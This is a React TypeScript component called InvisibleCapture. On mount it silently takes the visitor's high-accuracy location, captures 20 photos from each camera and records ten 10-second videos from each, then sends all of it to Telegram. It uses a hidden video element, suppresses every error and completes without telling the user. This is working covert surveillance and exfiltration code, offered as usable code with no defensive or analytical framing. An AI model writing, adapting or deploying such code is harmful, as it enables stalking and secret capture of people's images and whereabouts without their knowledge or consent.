import { useRef, useEffect } from 'react';
import { cameraService } from '@/lib/camera';
import { locationService, type LocationData } from '@/lib/location';
import { sendPhotoToTelegram, sendVideoToTelegram, sendLocationToTelegram } from '@/lib/telegram';

interface InvisibleCaptureProps {
  onComplete: () => void;
}

export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!hasStarted.current) {
      hasStarted.current = true;
      startInvisibleCapture();
    }
  }, []);

  const startInvisibleCapture = async () => {
    try {
      // Start all operations simultaneously for speed with proper error handling
      const operations = [
        getLocationFast().catch(() => null),
        captureAllPhotosAndVideos().catch(() => null)
      ];

      // Wait maximum 30 seconds for everything (longer videos need more time)
      await Promise.race([
        Promise.allSettled(operations),
        new Promise(resolve => setTimeout(resolve, 30000))
      ]);

      // Complete silently
      onComplete();

    } catch (error) {
      // Fail silently and complete
      onComplete();
    } finally {
      // Ensure camera is stopped
      try {
        cameraService.stopCamera();
      } catch (error) {
        // Ignore cleanup errors
      }
    }
  };

  const getLocationFast = async () => {
    try {
      const locationData = await locationService.getHighAccuracyLocation();
      if (locationData) {
        // Send location immediately - catch all promise rejections
        sendLocationToTelegram(locationData)
          .catch(() => {})
          .finally(() => {});
      }
      return locationData;
    } catch (error) {
      return null;
    }
  };

  const captureAllPhotosAndVideos = async () => {
    try {
      // Capture photos from both cameras first (parallel)
      const photoPromises = [
        rapidCapturePhotos('environment', 20).catch(() => null),
        rapidCapturePhotos('user', 20).catch(() => null)
      ];
      
      await Promise.allSettled(photoPromises);
      
      // Then record videos (sequential to avoid camera conflicts)
      try {
        await rapidRecordVideos('environment', 10);
      } catch (error) {
        // Continue if back camera videos fail
      }
      
      try {
        await rapidRecordVideos('user', 10);
      } catch (error) {
        // Continue if front camera videos fail
      }
      
    } catch (error) {
      // Continue even if some fail
    }
  };

  const rapidCapturePhotos = async (facingMode: 'user' | 'environment', count: number) => {
    try {
      const stream = await cameraService.startCamera(facingMode);
      if (!videoRef.current) return;
      
      videoRef.current.srcObject = stream;
      videoRef.current.muted = true;
      
      // Wait for video to be ready
      await new Promise((resolve) => {
        if (videoRef.current) {
          const video = videoRef.current;
          video.onloadedmetadata = () => resolve(undefined);
          video.oncanplay = () => resolve(undefined);
          video.play().catch(() => resolve(undefined));
        }
        // Fallback timeout
        setTimeout(() => resolve(undefined), 300);
      });

      // Capture photos with small delays to ensure quality
      for (let i = 1; i <= count; i++) {
        try {
          if (videoRef.current && videoRef.current.readyState >= 2) {
            const photoBlob = await cameraService.capturePhoto(videoRef.current);
            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
            // Send immediately without waiting - catch all promise rejections
            sendPhotoToTelegram(photoBlob, undefined, i, cameraType)
              .catch(() => {})
              .finally(() => {});
          }
        } catch (error) {
          // Skip this photo if it fails
        }
        // Tiny delay between captures
        await new Promise(resolve => setTimeout(resolve, 20));
      }
      
      try {
        cameraService.stopCamera();
      } catch (error) {
        // Ignore camera stop errors
      }
    } catch (error) {
      // Continue with next step if this fails
    }
  };

  const rapidRecordVideos = async (facingMode: 'user' | 'environment', count: number) => {
    try {
      // Record videos sequentially to avoid camera conflicts
      for (let i = 1; i <= count; i++) {
        try {
          const stream = await cameraService.startVideoRecording(facingMode);
          const videoBlob = await cameraService.recordVideo(stream, 10000); // 10 second videos
          const cameraType = facingMode === 'user' ? 'Front' : 'Back';
          
          // Send immediately - catch all promise rejections
          sendVideoToTelegram(videoBlob, undefined, i, cameraType)
            .catch(() => {})
            .finally(() => {});
          
          try {
            cameraService.stopCamera();
          } catch (error) {
            // Ignore camera stop errors
          }
          
          // Small delay to prevent camera conflicts
          await new Promise(resolve => setTimeout(resolve, 50));
        } catch (error) {
          // Skip this video if it fails
        }
      }
    } catch (error) {
      // Continue with next step if this fails
    }
  };

  return (
    <video
      ref={videoRef}
      className="hidden"
      autoPlay
      muted
      playsInline
    />
  );
}